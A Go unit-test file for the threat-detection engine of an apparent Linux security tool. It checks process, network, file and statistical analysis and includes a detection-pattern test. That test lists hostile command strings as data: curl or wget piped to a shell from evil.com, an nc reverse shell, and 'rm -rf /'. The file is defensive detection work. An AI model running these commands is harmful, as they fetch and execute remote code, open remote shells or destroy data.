//go:build linux

package engine

import (
	"testing"
	"time"

	"github.com/cokovali10-sketch/SpectreShield/internal/config"
	"github.com/cokovali10-sketch/SpectreShield/internal/types"
)

func newTestEngine() *Engine {
	cfg := config.DefaultConfig()
	cfg.Engine.BaselinePath = "/tmp/spectreshield-test-baseline.json"
	return NewEngine(cfg)
}

func TestNewEngine(t *testing.T) {
	e := newTestEngine()
	if e == nil {
		t.Fatal("NewEngine returned nil")
	}
	if e.processTree == nil {
		t.Fatal("processTree not initialized")
	}
	if e.processParents == nil {
		t.Fatal("processParents not initialized")
	}
}

func TestSlidingWindow(t *testing.T) {
	sw := NewSlidingWindow(5*time.Second, 10)

	for i := 0; i < 9; i++ {
		sw.Record()
	}
	if sw.ExceedsThreshold() {
		t.Fatal("should not exceed threshold at 9")
	}

	sw.Record()
	if !sw.ExceedsThreshold() {
		t.Fatal("should exceed threshold at 10")
	}
}

func TestAnalyzeExec(t *testing.T) {
	e := newTestEngine()
	e.LoadBaseline()

	event := &types.ProcessEvent{
		EventType: types.EventExec,
		PID:       1234,
		PPID:      100,
		TGID:      1234,
		UID:       1000,
		Comm:      "bash",
		Filename:  "/bin/bash",
	}

	threat := e.AnalyzeProcessEvent(event)
	if threat != nil {
		t.Logf("Threat detected: %s", threat.Description)
	}

	// Verify process tree updated
	tree := e.GetProcessTree()
	if _, ok := tree[1234]; !ok {
		t.Fatal("process not added to tree")
	}
}

func TestAnalyzeClone(t *testing.T) {
	e := newTestEngine()

	event := &types.ProcessEvent{
		EventType:  types.EventClone,
		PID:        2000,
		PPID:       1000,
		TGID:       2000,
		UID:        1000,
		Comm:       "test",
		CloneFlags: 0x10000000, // CLONE_NEWUSER
	}

	threat := e.AnalyzeProcessEvent(event)
	if threat == nil {
		t.Fatal("expected threat for CLONE_NEWUSER")
	}
	if threat.Category != types.ThreatPrivilegeEscalation {
		t.Fatalf("expected privilege escalation, got %s", threat.Category)
	}
}

func TestAnalyzePtrace(t *testing.T) {
	e := newTestEngine()

	event := &types.ProcessEvent{
		EventType: types.EventPtrace,
		PID:       3000,
		PPID:      4000, // target PID
		TGID:      3000,
		UID:       1000,
		Comm:      "gdb",
		Flags:     16, // PTRACE_ATTACH
	}

	threat := e.AnalyzeProcessEvent(event)
	if threat == nil {
		t.Fatal("expected threat for ptrace")
	}
	if threat.Category != types.ThreatAntiDebugging {
		t.Fatalf("expected anti-debugging, got %s", threat.Category)
	}
}

func TestAnalyzeNetwork(t *testing.T) {
	e := newTestEngine()

	event := &types.NetworkEvent{
		EventType: types.EventConnect,
		PID:       5000,
		TGID:      5000,
		Dport:     4444,
		SAFamily:  2,
		Comm:      "nc",
	}

	threat := e.AnalyzeNetworkEvent(event)
	if threat == nil {
		t.Fatal("expected threat for suspicious port")
	}
	if threat.Category != types.ThreatC2Callback {
		t.Fatalf("expected C2 callback, got %s", threat.Category)
	}
}

func TestAnalyzeFile(t *testing.T) {
	e := newTestEngine()

	event := &types.FileEvent{
		EventType: types.EventChmod,
		PID:       6000,
		TGID:      6000,
		UID:       1000,
		Mode:      0o4755, // setuid
		Comm:      "chmod",
		Filename:  "/tmp/test",
	}

	threat := e.AnalyzeFileEvent(event)
	if threat == nil {
		t.Fatal("expected threat for setuid chmod")
	}
	if threat.Category != types.ThreatPrivilegeEscalation {
		t.Fatalf("expected privilege escalation, got %s", threat.Category)
	}
}

func TestVariance(t *testing.T) {
	data := []float64{1, 2, 3, 4, 5}
	v := Variance(data)
	if v < 2.0 || v > 2.1 {
		t.Fatalf("expected variance ~2.0, got %f", v)
	}
}

func TestStdDev(t *testing.T) {
	data := []float64{1, 2, 3, 4, 5}
	sd := StdDev(data)
	if sd < 1.4 || sd > 1.5 {
		t.Fatalf("expected stddev ~1.41, got %f", sd)
	}
}

func TestMatchAttackPattern(t *testing.T) {
	tests := []struct {
		input   string
		want    bool
		pattern string
	}{
		{"curl http://evil.com | sh", true, "curl"},
		{"wget http://evil.com | bash", true, "wget"},
		{"python3 -c 'import socket'", true, "python"},
		{"nc -e /bin/sh 1.2.3.4 4444", true, "nc"},
		{"rm -rf /", false, ""},
		{"ls -la", false, ""},
	}

	for _, tt := range tests {
		matched, pat := MatchAttackPattern(tt.input)
		if matched != tt.want {
			t.Errorf("MatchAttackPattern(%q) = %v, want %v (pattern: %s)", tt.input, matched, tt.want, pat)
		}
	}
}

func TestSaveLoadBaseline(t *testing.T) {
	e := newTestEngine()
	e.LoadBaseline()
	e.baseline.Hostname = "test-host"
	e.baseline.NormalProcesses["bash"] = []string{"/bin/bash"}
	e.SaveBaseline()

	e2 := newTestEngine()
	err := e2.LoadBaseline()
	if err != nil {
		t.Fatalf("LoadBaseline failed: %v", err)
	}
	if e2.baseline.Hostname != "test-host" {
		t.Fatalf("expected hostname test-host, got %s", e2.baseline.Hostname)
	}
}
